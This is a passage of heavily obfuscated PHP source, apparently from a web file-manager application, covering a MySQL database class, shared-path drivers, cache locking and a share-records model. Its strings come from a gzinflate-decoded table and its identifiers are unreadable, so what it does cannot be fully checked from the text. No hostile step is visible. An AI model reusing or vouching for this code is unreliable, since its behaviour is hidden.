$Ãİ‹Ä˜è = false) { unset($_COOKIE[$ô©¡àş]); self::set($ô©¡àş, $_SERVER[ÅÄÇĞô][12], 1, $Ãİ‹Ä˜è); } } class DbMysql extends Db { public function __construct($Ì²ëõ¡¬ = '') { $©Éğ¸¢Î =& $_SERVER[ÅÄÇĞô]; if (!extension_loaded($©Éğ¸¢Î[903])) { think_exception(think_lang($©Éğ¸¢Î[14]) . $©Éğ¸¢Î[985]); } if (!empty($Ì²ëõ¡¬)) { $this->config = $Ì²ëõ¡¬; if (empty($this->config[$©Éğ¸¢Î[17]])) { $this->config[$©Éğ¸¢Î[17]] = $©Éğ¸¢Î[12]; } } } public function connect($ïòì¾â = '', $Ù¬†‡§ã = 0, $ˆ›š¿Ç = false) { $·á´íè =& $_SERVER[ÅÄÇĞô]; if (!isset($this->linkID[$Ù¬†‡§ã])) { if (empty($ïòì¾â)) { $ïòì¾â = $this->config; } $¡ü¾òïç = $ïòì¾â[$·á´íè[986]] . ($ïòì¾â[$·á´íè[987]] ? "\x3a{$ïòì¾â[$·á´íè[987]]}" : $·á´íè[12]); $ˆµëê¦… = !empty($ïòì¾â[$·á´íè[17]][$·á´íè[18]]) ? $ïòì¾â[$·á´íè[17]][$·á´íè[18]] : $this->pconnect; if ($ˆµëê¦…) { $this->linkID[$Ù¬†‡§ã] = mysql_pconnect($¡ü¾òïç, $ïòì¾â[$·á´íè[988]], $ïòì¾â[$·á´íè[989]], 131072); } else { $this->linkID[$Ù¬†‡§ã] = mysql_connect($¡ü¾òïç, $ïòì¾â[$·á´íè[988]], $ïòì¾â[$·á´íè[989]], !0, 131072); } if (!$this->linkID[$Ù¬†‡§ã] || !empty($ïòì¾â[$·á´íè[21]]) && !mysql_select_db($ïòì¾â[$·á´íè[21]], $this->linkID[$Ù¬†‡§ã])) { think_exception(mysql_error()); } $¡âÌÔáü = mysql_get_server_info($this->linkID[$Ù¬†‡§ã]); mysql_query($·á´íè[990] . think_config($·á´íè[991]) . $·á´íè[58], $this->linkID[$Ù¬†‡§ã]); if ($¡âÌÔáü > $·á´íè[992]) { mysql_query($·á´íè[993], $this->linkID[$Ù¬†‡§ã]); } $this->connected = !0; if (1 != think_config($·á´íè[22])) { unset($this->config); } } return $this->linkID[$Ù¬†‡§ã]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($³Œô“ƒå) { $ØøŞ¥ìÀ =& $_SERVER[ÅÄÇĞô]; if (0 === stripos($³Œô“ƒå, $ØøŞ¥ìÀ[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³Œô“ƒå; if ($this->queryID) { $this->free(); } think_action_status($ØøŞ¥ìÀ[23], 1); think_status($ØøŞ¥ìÀ[24]); $this->queryID = mysql_query($³Œô“ƒå, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($öõ¶¯ã) { $ËğşÙäÈ =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $öõ¶¯ã; if ($this->queryID) { $this->free(); } think_action_status($ËğşÙäÈ[25], 1); think_status($ËğşÙäÈ[24]); $Ñ¥é±äş = mysql_query($öõ¶¯ã, $this->_linkID); $this->debug(); if (!1 === $Ñ¥é±äş) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÅÄÇĞô][994], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰¸Á´ìá = mysql_query($_SERVER[ÅÄÇĞô][995], $this->_linkID); $this->transTimes = 0; if (!$‰¸Á´ìá) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú³Š‹ıÏ = mysql_query($_SERVER[ÅÄÇĞô][996], $this->_linkID); $this->transTimes = 0; if (!$Ú³Š‹ıÏ) { $this->error(); return !1; } } return !0; } private function getAll() { $İ‹çªö¬ = array(); if ($this->numRows > 0) { while ($ôØì†”‚ = mysql_fetch_assoc($this->queryID)) { $İ‹çªö¬[] = $ôØì†”‚; } mysql_data_seek($this->queryID, 0); } return $İ‹çªö¬; } public function getFields($•ñ˜÷œŒ) { $¯öÃ€Îº =& $_SERVER[ÅÄÇĞô]; $õ×—‡™õ = $this->query($¯öÃ€Îº[997] . $this->parseKey($•ñ˜÷œŒ)); $…á­•€à = array(); if ($õ×—‡™õ) { foreach ($õ×—‡™õ as $¿Ÿ¥ò¬‘ => $‰øÆÕ·Ä) { $…á­•€à[$‰øÆÕ·Ä[$¯öÃ€Îº[31]]] = array($¯öÃ€Îº[32] => $‰øÆÕ·Ä[$¯öÃ€Îº[31]], $¯öÃ€Îº[33] => $‰øÆÕ·Ä[$¯öÃ€Îº[34]], $¯öÃ€Îº[35] => (bool) (strtoupper($‰øÆÕ·Ä[$¯öÃ€Îº[36]]) === $¯öÃ€Îº[998]), $¯öÃ€Îº[37] => $‰øÆÕ·Ä[$¯öÃ€Îº[38]], $¯öÃ€Îº[39] => strtolower($‰øÆÕ·Ä[$¯öÃ€Îº[40]]) == $¯öÃ€Îº[41], $¯öÃ€Îº[42] => strtolower($‰øÆÕ·Ä[$¯öÃ€Îº[43]]) == $¯öÃ€Îº[44]); } } return $…á­•€à; } public function getTables($øó£Ã‡ó = '') { $¦×æˆÏÀ =& $_SERVER[ÅÄÇĞô]; if (!empty($øó£Ã‡ó)) { $ï«Õ˜µõ = $¦×æˆÏÀ[999] . $øó£Ã‡ó . $¦×æˆÏÀ[1000]; } else { $ï«Õ˜µõ = $¦×æˆÏÀ[1001]; } $¢éŒĞš = $this->query($ï«Õ˜µõ); $ŠóÇÌûÔ = array(); foreach ($¢éŒĞš as $í‘äŒïÑ => $ç· å–) { $ŠóÇÌûÔ[$í‘äŒïÑ] = current($ç· å–); } return $ŠóÇÌûÔ; } public function replace($¶™øğë®, $Ã“Çí­¼ = array()) { $³¶ñõ¼õ =& $_SERVER[ÅÄÇĞô]; foreach ($¶™øğë® as $Ö€È¡ú° => $Î°Èş¿÷) { $Ââò‘—Š = $this->parseValue($Î°Èş¿÷); if (is_scalar($Ââò‘—Š)) { $ÁşÊ‘€[] = $Ââò‘—Š; $æ‚äºÒë[] = $this->parseKey($Ö€È¡ú°); } } $²ÄşÌô = $³¶ñõ¼õ[1002] . $this->parseTable($Ã“Çí­¼[$³¶ñõ¼õ[359]]) . $³¶ñõ¼õ[1003] . implode($³¶ñõ¼õ[50], $æ‚äºÒë) . $³¶ñõ¼õ[1004] . implode($³¶ñõ¼õ[50], $ÁşÊ‘€) . $³¶ñõ¼õ[1005]; return $this->execute($²ÄşÌô); } public function insertAll($¤´€›©ı, $áàşÛÅÇ = array(), $§í‰‹÷• = false) { $œé¦ÊÜî =& $_SERVER[ÅÄÇĞô]; if (!is_array($¤´€›©ı[0])) { return !1; } $øûÓ„¯ = array_keys($¤´€›©ı[0]); $ÀÉ°îö = array(); foreach ($¤´€›©ı as $÷ºŒßÊ°) { $õÓ˜ğá = array(); foreach ($÷ºŒßÊ° as $ÎÚ°” => $§é‘é—Æ) { $§é‘é—Æ = $this->parseValue($§é‘é—Æ); if (is_scalar($§é‘é—Æ)) { $õÓ˜ğá[] = $§é‘é—Æ; } } $ÀÉ°îö[] = $œé¦ÊÜî[340] . implode($œé¦ÊÜî[50], $õÓ˜ğá) . $œé¦ÊÜî[1005]; } array_walk($øûÓ„¯, array($this, $œé¦ÊÜî[1006])); $öŠÆ‰ = ($§í‰‹÷• ? $œé¦ÊÜî[1007] : $œé¦ÊÜî[1008]) . $œé¦ÊÜî[1009] . $this->parseTable($áàşÛÅÇ[$œé¦ÊÜî[359]]) . $œé¦ÊÜî[1003] . implode($œé¦ÊÜî[50], $øûÓ„¯) . $œé¦ÊÜî[1010] . implode($œé¦ÊÜî[50], $ÀÉ°îö); return $this->execute($öŠÆ‰); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $õ¢ÖÉ§ =& $_SERVER[ÅÄÇĞô]; $this->error = mysql_errno() . $õ¢ÖÉ§[4] . mysql_error($this->_linkID); if ($õ¢ÖÉ§[12] != $this->queryStr) { $this->error .= LNG($õ¢ÖÉ§[48]) . $this->queryStr; } think_trace($this->error, $õ¢ÖÉ§[12], $õ¢ÖÉ§[49]); return $this->error; } public function escapeString($şğÜÅ’) { if ($this->_linkID) { return mysql_real_escape_string($şğÜÅ’, $this->_linkID); } else { return mysql_escape_string($şğÜÅ’); } } public function parseKey(&$áÓê‡…Ë, $ôí·áãî = true) { $ÌˆÇ’å =& $_SERVER[ÅÄÇĞô]; if ($ôí·áãî) { $áÓê‡…Ë = $this->parseKeyCheck($áÓê‡…Ë); } if ($áÓê‡…Ë != $ÌˆÇ’å[223] && !preg_match($ÌˆÇ’å[1011], $áÓê‡…Ë)) { $áÓê‡…Ë = $ÌˆÇ’å[464] . trim($áÓê‡…Ë, $ÌˆÇ’å[464]) . $ÌˆÇ’å[464]; } return $áÓê‡…Ë; } } goto AÜ§§¡¨²‰; AÒäÂøÇ²: class PathDriverDriverShareItem { public function __construct($¯ñà–¤é) { $this->pathParse = $¯ñà–¤é; } public function __call($ë¡›‹‹, $’‡¤ößı) { $ôÆíß =& $_SERVER[ÅÄÇĞô]; if (method_exists($this, $ë¡›‹‹)) { return; } $Æ«‹¼€í = call_user_func_array(array($ôÆíß[1453], $ë¡›‹‹), $’‡¤ößı); $ ÅÏêç = array($ôÆíß[1454], $ôÆíß[1455], $ôÆíß[1456], $ôÆíß[1457], $ôÆíß[626], $ôÆíß[628], $ôÆíß[1458], $ôÆíß[110], $ôÆíß[1459], $ôÆíß[1460]); if (in_array($ë¡›‹‹, $ ÅÏêç)) { $Æ«‹¼€í = $this->getPathOuter($Æ«‹¼€í); } return $Æ«‹¼€í; } public function copy($¥‡Á¿±†, $ŠöØø·›, $ÒÕœå‘ñ = false, $ºÆ‰ ›À = false) { return $this->copyMove($¥‡Á¿±†, $ŠöØø·›, $ÒÕœå‘ñ, $_SERVER[ÅÄÇĞô][626], $ºÆ‰ ›À); } public function move($Êö“öû·, $óÍ¼åú, $¯ş‚úå¯ = false, $´‚ºù—¦ = false) { return $this->copyMove($Êö“öû·, $óÍ¼åú, $¯ş‚úå¯, $_SERVER[ÅÄÇĞô][628], $´‚ºù—¦); } private function copyMove($¶—¦ºã‰, $ŸÕíÅÒÛ, $æÚ÷ÙŞè, $½ Êö, $Ñ“ÈíÇ = false) { $‰è£‚ƒğ =& $_SERVER[ÅÄÇĞô]; $ªµŸ¯‰Î = $ŸÕíÅÒÛ; $‚…¶“ñÖ = IO::driverMake($ŸÕíÅÒÛ); if ($‚…¶“ñÖ->pathParse[$‰è£‚ƒğ[1255]]) { $ŸÕíÅÒÛ = $‚…¶“ñÖ->pathParse[$‰è£‚ƒğ[1255]]; } else { $ŸÕíÅÒÛ = $ªµŸ¯‰Î; } $¸ÉåãÓ = IO::copyMove($¶—¦ºã‰, $ŸÕíÅÒÛ, $æÚ÷ÙŞè, $½ Êö, $Ñ“ÈíÇ); $¸ÉåãÓ = $this->getPathOuter($¸ÉåãÓ); return $¸ÉåãÓ; } public function pathThis($ªŞ­ï„á) { return get_path_this($this->pathParse[$_SERVER[ÅÄÇĞô][87]]); } public function pathFather($á·âñõè) { return get_path_father($this->pathParse[$_SERVER[ÅÄÇĞô][87]]); } public function iconvSystem($ş‡¹÷ô–) { return $ş‡¹÷ô–; } protected function infoParse($‡ ­á¹ñ, $ÕŒ„‘¦ = false) { $•âÇÊà´ =& $_SERVER[ÅÄÇĞô]; $ì©™ß• = $this->pathParse[$•âÇÊà´[565]][$•âÇÊà´[1280]] . $this->pathParse[$•âÇÊà´[1273]]; if ($ÕŒ„‘¦) { $ÆöÙÈÁ¯ = IO::infoWithChildren($ì©™ß•); } else { $ÆöÙÈÁ¯ = IO::info($ì©™ß•); } $µ´Æš‹ë = $this->pathParse[$•âÇÊà´[565]]; return Action($•âÇÊà´[1451])->_shareItemeParse($ÆöÙÈÁ¯, $µ´Æš‹ë); } public function listAll($Şº˜ë³³) { $­ò×ñ®€ =& $_SERVER[ÅÄÇĞô]; $š†ßÄ½— = IO::listAll($Şº˜ë³³); $¬¦¾Õ¿è = rtrim($this->pathParse[$­ò×ñ®€[565]][$­ò×ñ®€[1280]], $­ò×ñ®€[8]); foreach ($š†ßÄ½— as &$…äîúŸ) { $…äîúŸ[$­ò×ñ®€[87]] = $this->pathDriver . $­ò×ñ®€[8] . ltrim(substr($…äîúŸ[$­ò×ñ®€[87]], strlen($¬¦¾Õ¿è)), $­ò×ñ®€[8]); } unset($…äîúŸ); return $š†ßÄ½—; } public function listAllSimple($®…ù«§ª, $À¢×«û² = false) { $Í ùìÁ² =& $_SERVER[ÅÄÇĞô]; $Á¯ö²˜ = $this->listAll($®…ù«§ª); $’¤‚²ôà = $this->pathParse[$Í ùìÁ²[498]]; if (trim($’¤‚²ôà, $Í ùìÁ²[8]) == trim(get_path_father($’¤‚²ôà), $Í ùìÁ²[8])) { $À¢×«û² = !0; } return IO::init($Í ùìÁ²[12])->listAllSimpleMake($Á¯ö²˜, $’¤‚²ôà, $À¢×«û²); } public function getPathOuter($óæü˜ê€) { $Ş×Ğû¡ =& $_SERVER[ÅÄÇĞô]; $ìŸËó‰š = KodIO::parse($óæü˜ê€); if ($ìŸËó‰š[$Ş×Ğû¡[33]] == KodIO::KOD_SHARE_ITEM) { return $ìŸËó‰š[$Ş×Ğû¡[87]]; } $êíª•İ = KodIO::clear($óæü˜ê€); $•¼şûæ§ = KodIO::clear($this->pathParse[$Ş×Ğû¡[565]][$Ş×Ğû¡[1280]]); $øõÑúİÅ = substr($êíª•İ, strlen($•¼şûæ§)); if (substr($êíª•İ, 0, strlen($•¼şûæ§)) != $•¼şûæ§) { return !1; } return $this->pathParse[$Ş×Ğû¡[1274]] . $Ş×Ğû¡[8] . ltrim($øõÑúİÅ, $Ş×Ğû¡[8]); } public function getType() { $¤‘åÇ–œ =& $_SERVER[ÅÄÇĞô]; $ï­±ê = str_replace($¤‘åÇ–œ[77], $¤‘åÇ–œ[12], get_class($this)); return strtolower($ï­±ê); } public function isOsDriver($ıö”•ÈÔ) { return IO::isOsDriver($ıö”•ÈÔ); } public function info($àÏ³ÛåÈ) { return $this->infoParse($àÏ³ÛåÈ); } public function infoAuth($şøÄÅ­Ú) { return $this->infoParse($şøÄÅ­Ú); } public function infoWithChildren($û–¢Ş¶) { return $this->infoParse($û–¢Ş¶, !0); } public function infoFull($üÉ¾å”±) { return $this->infoParse($üÉ¾å”±); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ãœÉ‹Şº) { $this->pathParse = $ãœÉ‹Şº; } protected function infoParse($‰õ€ô«¹, $Ãâ÷Ÿá¨ = false) { $§ úŒ±¦ =& $_SERVER[ÅÄÇĞô]; return Action($§ úŒ±¦[1279])->sharePathInfo($this->pathParse[$§ úŒ±¦[87]], !0, $Ãâ÷Ÿá¨); } public function listPath($Ÿ«üÌ‘, $î©ßóõÆ = false) { $Ï÷ƒğ¶œ =& $_SERVER[ÅÄÇĞô]; $°Œ«‡©Ó = IO::listPath($Ÿ«üÌ‘, $î©ßóõÆ); if (!$°Œ«‡©Ó) { return $°Œ«‡©Ó; } if (is_array($°Œ«‡©Ó[$Ï÷ƒğ¶œ[1452]])) { $ÓÖå–§‰ = Action($Ï÷ƒğ¶œ[1461])->parsePathChildren($°Œ«‡©Ó[$Ï÷ƒğ¶œ[1452]], array($Ï÷ƒğ¶œ[498] => $Ÿ«üÌ‘)); $°Œ«‡©Ó[$Ï÷ƒğ¶œ[1452]] = Action($Ï÷ƒğ¶œ[1279])->shareItemInfo($ÓÖå–§‰); } foreach ($°Œ«‡©Ó as $À»Ï‚ª => $ŒÔìÜŒÆ) { if (!in_array($À»Ï‚ª, array($Ï÷ƒğ¶œ[86], $Ï÷ƒğ¶œ[85]))) { continue; } foreach ($ŒÔìÜŒÆ as $°®“‡Ô‰ => $ÓÖå–§‰) { $ÓÖå–§‰ = Action($Ï÷ƒğ¶œ[1461])->parsePathChildren($ÓÖå–§‰, array($Ï÷ƒğ¶œ[498] => $Ÿ«üÌ‘)); $°Œ«‡©Ó[$À»Ï‚ª][$°®“‡Ô‰] = Action($Ï÷ƒğ¶œ[1279])->shareItemInfo($ÓÖå–§‰); } } return $°Œ«‡©Ó; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($³ë§Î¨Í) { parent::__construct($³ë§Î¨Í); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } } goto E†ÈöÚ§»ó; C›µò–˜Ê†: define($_SERVER[ÅÄÇĞô][0], $_SERVER[ÅÄÇĞô][1]); $_SERVER[‹×Š·Ú¹] = explode($_SERVER[ÅÄÇĞô][2], gzinflate(substr($_SERVER[ÅÄÇĞô][3], 10, -8))); function binCheckEq($ÂÓÖ¸¹Ÿ, $À›•ŒÖø) { return $ÂÓÖ¸¹Ÿ == $À›•ŒÖø; } goto Bà¦Œ ‘šô; Cª¡»¨ç­…: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $²öÖèû® =& $_SERVER[ÅÄÇĞô]; $‡‚×‡¦¤ = $GLOBALS[$²öÖèû®[6]][$²öÖèû®[427]]; self::$cachePath = $‡‚×‡¦¤[$²öÖèû®[233]][$²öÖèû®[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÙÌÓÅ×, $ÆÀüâêÆ = 0) { $œÜ²ÙÔ± =& $_SERVER[ÅÄÇĞô]; $ùıÒ¿Í¶ = microtime(!0); $Ü°¸Ğ†Ğ = $ùıÒ¿Í¶ + $ÆÀüâêÆ + 0.0001; $”úƒÈáÉ = rtrim(self::$cachePath, $œÜ²ÙÔ±[8]) . $œÜ²ÙÔ±[965] . md5($ÙÌÓÅ×) . $œÜ²ÙÔ±[962]; if (file_exists($”úƒÈáÉ) && filemtime($”úƒÈáÉ) && filemtime($”úƒÈáÉ) < time() - 10) { @unlink($”úƒÈáÉ); } do { if (file_exists($”úƒÈáÉ)) { cacheLockWait(); continue; } $³™ÏàÛ = fopen($”úƒÈáÉ, $œÜ²ÙÔ±[966]); if (!$³™ÏàÛ) { return !1; } $ê‡¦ë— = flock($³™ÏàÛ, LOCK_EX | LOCK_NB); self::$caches[$ÙÌÓÅ×] = array($œÜ²ÙÔ±[967] => $³™ÏàÛ, $œÜ²ÙÔ±[233] => $”úƒÈáÉ); fwrite($³™ÏàÛ, $Ü°¸Ğ†Ğ); clearstatcache(); if ($³™ÏàÛ && $ê‡¦ë—) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ü°¸Ğ†Ğ); $this->unlock($ÙÌÓÅ×); return !1; } public function lockGet($ÜŸŠ¯¡Ü) { $Ç‘ø¥˜» =& $_SERVER[ÅÄÇĞô]; $ù•´³åí = rtrim(self::$cachePath, $Ç‘ø¥˜»[8]) . $Ç‘ø¥˜»[965] . md5($ÜŸŠ¯¡Ü) . $Ç‘ø¥˜»[962]; return file_exists($ù•´³åí); } public function unlock($şç¶¨¼ª) { $Ì»›½Ä =& $_SERVER[ÅÄÇĞô]; $¤¸˜¹‹è = self::$caches[$şç¶¨¼ª]; if (!$¤¸˜¹‹è) { return; } @flock($¤¸˜¹‹è[$Ì»›½Ä[967]], LOCK_UN); @fclose($¤¸˜¹‹è[$Ì»›½Ä[967]]); @unlink($¤¸˜¹‹è[$Ì»›½Ä[233]]); unset(self::$caches[$şç¶¨¼ª]); } } class CacheLockRedis { public function lock($Êíò½İ›, $­ˆ÷ºƒó = 10) { $à‡ï¢ëè = Cache::init(); $È¡ÒÍ = microtime(!0) + $­ˆ÷ºƒó; while (microtime(!0) < $È¡ÒÍ) { $¹¾ˆòÎ = $à‡ï¢ëè->get($Êíò½İ›); if (!$¹¾ˆòÎ) { $ï©ë¿š¸ = $à‡ï¢ëè->setLock($Êíò½İ›, $È¡ÒÍ, $­ˆ÷ºƒó); if ($ï©ë¿š¸) { return !0; } } else { if ($¹¾ˆòÎ < microtime(!0)) { $à‡ï¢ëè->set($Êíò½İ›, $È¡ÒÍ, $­ˆ÷ºƒó * 2); if ($à‡ï¢ëè->get($Êíò½İ›) === $¹¾ˆòÎ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¹îÚÇÏÉ) { return Cache::init()->get($¹îÚÇÏÉ); } public function unlock($®ÀÙä…) { return Cache::init()->remove($®ÀÙä…); } } goto dÜ–÷´œßø; a®´ì°É£ï: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\x54\x69\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74\54\x75\160\x64\141\164\x65", "\x66\165\x6e\143\x74\151\x6f\156"), array("\143\162\x65\141\164\145\x54\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\157\160\x74\x69\x6f\156\x73", '', "\x69\x6e\x73\x65\162\x74\54\x75\160\x64\x61\x74\x65\x2c\163\x65\x6c\x65\143\x74", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ç¤ƒœ) { $®ûó½Ÿ‘ =& $_SERVER[ÅÄÇĞô]; $¯É¨ß‹ = isset($Ç¤ƒœ[0]) ? $Ç¤ƒœ[0] : !1; $ï•¬Àá = $®ûó½Ÿ‘[2141] . USER_ID; return array($®ûó½Ÿ‘[2142] => array(USER_ID, $®ûó½Ÿ‘[2143]), $®ûó½Ÿ‘[2082] => array($¯É¨ß‹, $®ûó½Ÿ‘[2144], $ï•¬Àá)); } protected function listSimple() { $¶èÉ§Äµ = array($_SERVER[ÅÄÇĞô][1797] => USER_ID); $ãç˜éş = $this->field($this->fieldList)->where($¶èÉ§Äµ)->select(); return $ãç˜éş ? $ãç˜éş : array(); } protected function getInfo($–ï»Ø´, $û¶œ¬¹ = false, $–¿ÎÃô = '') { $İ˜ÙÁğÎ =& $_SERVER[ÅÄÇĞô]; if (!$–¿ÎÃô) { $–¿ÎÃô = $İ˜ÙÁğÎ[2141] . USER_ID; } if ($û¶œ¬¹) { return $this->_getShareInfo(array($İ˜ÙÁğÎ[673] => $–ï»Ø´)); } $üµê ±î = $this->cacheFunctionGet($İ˜ÙÁğÎ[2084], $–ï»Ø´, $–¿ÎÃô); $Ì¦‹µÍÇ = $this->shareInfoMofify($üµê ±î, $İ˜ÙÁğÎ[226]); if (isset($üµê ±î[$İ˜ÙÁğÎ[88]]) && $Ì¦‹µÍÇ != $üµê ±î[$İ˜ÙÁğÎ[88]]) { $Í·ïµ³á = $this->cacheKeyMake($İ˜ÙÁğÎ[2084], $–ï»Ø´, $–¿ÎÃô); $üµê ±î = $this->_getShareInfo(array($İ˜ÙÁğÎ[673] => $–ï»Ø´)); Cache::set($Í·ïµ³á, $üµê ±î); } return $üµê ±î; } private function shareInfoMofify(&$¯Şùšâ×, $ÎûÑåüò = "\x67\x65\164") { $ïÑúĞ† =& $_SERVER[ÅÄÇĞô]; if (!$¯Şùšâ× || !isset($¯Şùšâ×[$ïÑúĞ†[673]])) { return; } $Âºèß© = $ïÑúĞ†[2145] . $¯Şùšâ×[$ïÑúĞ†[673]]; if ($ÎûÑåüò == $ïÑúĞ†[226]) { return Cache::get($Âºèß©); } else { if ($ÎûÑåüò == $ïÑúĞ†[2112]) { $‰Éî¯ = Cache::get($Âºèß©); if ($‰Éî¯ === $¯Şùšâ×[$ïÑúĞ†[88]]) { return; } $¯Şùšâ×[$ïÑúĞ†[2146]] = USER_ID . $ïÑúĞ†[465] . $¯Şùšâ×[$ïÑúĞ†[88]]; Cache::set($Âºèß©, $¯Şùšâ×[$ïÑúĞ†[88]]); } else { if ($ÎûÑåüò == $ïÑúĞ†[2147]) { Cache::remove($Âºèß©); } } } } public function getInfoByHash($ÏñÙµµ) { return $this->_getShareInfo(array($_SERVER[ÅÄÇĞô][2148] => $ÏñÙµµ)); } public function getInfoByPath($ºÉã¢) { $Ó¤ò°ñ =& $_SERVER[ÅÄÇĞô]; $Ú˜¯ò° = array($Ó¤ò°ñ[1797] => USER_ID, $Ó¤ò°ñ[194] => $ºÉã¢); return $this->_getShareInfo($Ú˜¯ò°); } public function getInfoBySourcePath($ËŞöæÌ) { $“ôó”ºË =& $_SERVER[ÅÄÇĞô]; $‘äÌ¢ß = array($“ôó”ºË[1797] => USER_ID, $“ôó”ºË[1280] => $ËŞöæÌ); return $this->_getShareInfo($‘äÌ¢ß); } private function _getShareInfo($…„ÑÒã„) { $¬Œ§ƒ« =& $_SERVER[ÅÄÇĞô]; $õü½ş§¨ = $this->where($…„ÑÒã„)->find(); if (!$õü½ş§¨) { return !1; } $…„ÑÒã„ = array($¬Œ§ƒ«[673] => $õü½ş§¨[$¬Œ§ƒ«[673]]); $åïÕµåß = $¬Œ§ƒ«[2149]; $ÂÇ¥ìÂ½ = Model($¬Œ§ƒ«[674])->order($¬Œ§ƒ«[478])->field($åïÕµåß)->where($…„ÑÒã„)->select(); if ($õü½ş§¨[$¬Œ§ƒ«[194]] == $¬Œ§ƒ«[231]) { $õü½ş§¨[$¬Œ§ƒ«[90]] = IO::info($õü½ş§¨[$¬Œ§ƒ«[1280]]); } else { $õü½ş§¨[$¬Œ§ƒ«[90]] = Model($¬Œ§ƒ«[1444])->pathInfo($õü½ş§¨[$¬Œ§ƒ«[194]]); } $õü½ş§¨[$¬Œ§ƒ«[2150]] = $ÂÇ¥ìÂ½; $this->shareInfoMofify($õü½ş§¨, $¬Œ§ƒ«[2112]); return $õü½ş§¨; } protected function getInfoAuth($ĞöÄâ‡±) { $áÆã™êÈ =& $_SERVER[ÅÄÇĞô]; $òÅ§—­ƒ = $this->getInfo($ĞöÄâ‡±); if ($òÅ§—­ƒ[$áÆã™êÈ[1797]] == USER_ID) { $òÅ§—­ƒ[$áÆã™êÈ[490]] = $òÅ§—­ƒ[$áÆã™êÈ[90]][$áÆã™êÈ[490]]; } else { $òÅ§—­ƒ[$áÆã™êÈ[490]] = Model($áÆã™êÈ[572])->authMake($òÅ§—­ƒ[$áÆã™êÈ[2150]]); } return $òÅ§—­ƒ; } protected function listData($¨á¡ßš  = null, $õ¹øÁì´ = 300) { $œÇ¿¯Úç =& $_SERVER[ÅÄÇĞô]; $¤™â¨×Ù = array(array($œÇ¿¯Úç[567] => array($œÇ¿¯Úç[1112], 0), $œÇ¿¯Úç[671] => array($œÇ¿¯Úç[1112], 0), $œÇ¿¯Úç[2151] => $œÇ¿¯Úç[2100])); if ($¨á¡ßš  == $œÇ¿¯Úç[2152]) { $¤™â¨×Ù = array($œÇ¿¯Úç[567] => 1); } else { if ($¨á¡ßš  == $œÇ¿¯Úç[1265]) { $¤™â¨×Ù = array($œÇ¿¯Úç[671] => 1); } } $¤™â¨×Ù[$œÇ¿¯Úç[1797]] = USER_ID; $Êä‰¢’£ = $this->where($¤™â¨×Ù)->selectPage($õ¹øÁì´); return $Êä‰¢’£; } protected function listToMe($ÜÛòÊ³ß = 300) { $ı½¶¶‡£ =& $_SERVER[ÅÄÇĞô]; $Ãàîñ„Š = Model($ı½¶¶‡£[2153])->userGroupParents(USER_ID); $ÒÔÕ•³Ì = array($ı½¶¶‡£[656] => SourceModel::TYPE_USER, $ı½¶¶‡£[574] => USER_ID); if ($Ãàîñ„Š) { $ÒÔÕ•³Ì = array(array($ı½¶¶‡£[656] => SourceModel::TYPE_USER, $ı½¶¶‡£[574] => USER_ID), array($ı½¶¶‡£[656] => SourceModel::TYPE_GROUP, $ı½¶¶‡£[574] => array($ı½¶¶‡£[7], $Ãàîñ„Š)), $ı½¶¶‡£[2151] => $ı½¶¶‡£[2100]); } $åêéÈÏ = Model($ı½¶¶‡£[674])->where($ÒÔÕ•³Ì)->selectPage($ÜÛòÊ³ß); $‡‹ Ñı€ = array_to_keyvalue_group($åêéÈÏ[$ı½¶¶‡£[448]], $ı½¶¶‡£[673]); if (!$‡‹ Ñı€) { return $åêéÈÏ; } $¸¿¬Ïª = $ı½¶¶‡£[2154]; $ÒÔÕ•³Ì = array($ı½¶¶‡£[673] => array($ı½¶¶‡£[495], array_keys($‡‹ Ñı€)), $ı½¶¶‡£[1797] => array($ı½¶¶‡£[1114], $ı½¶¶‡£[231])); $‹·®‘š = $this->field($¸¿¬Ïª)->where($ÒÔÕ•³Ì)->select(); foreach ($‹·®‘š as $•—Õ˜±ü => &$áŠÇäÄ¨) { $áŠÇäÄ¨[$ı½¶¶‡£[2150]] = $‡‹ Ñı€[$áŠÇäÄ¨[$ı½¶¶‡£[673]]]; } unset($áŠÇäÄ¨); $´»ªßé = array($ı½¶¶‡£[2155] => $‹·®‘š, $ı½¶¶‡£[2156] => $åêéÈÏ[$ı½¶¶‡£[445]]); return $´»ªßé; } protected function shareAdd($Š…¶Ï¼®, $ŞêØÆúÚ) { $¯¬ÁóÒ =& $_SERVER[ÅÄÇĞô]; $ÑÙÒ™Ú = $this->_addShareData($Š…¶Ï¼®, $ŞêØÆúÚ); if (!empty($ŞêØÆúÚ[$¯¬ÁóÒ[2157]])) { $this->_shareAuthSet($ÑÙÒ™Ú, $ŞêØÆúÚ[$¯¬ÁóÒ[2157]]); } $this->shareEventAdd($Š…¶Ï¼®, $ŞêØÆúÚ, $¯¬ÁóÒ[2158]); return $ÑÙÒ™Ú; } protected function 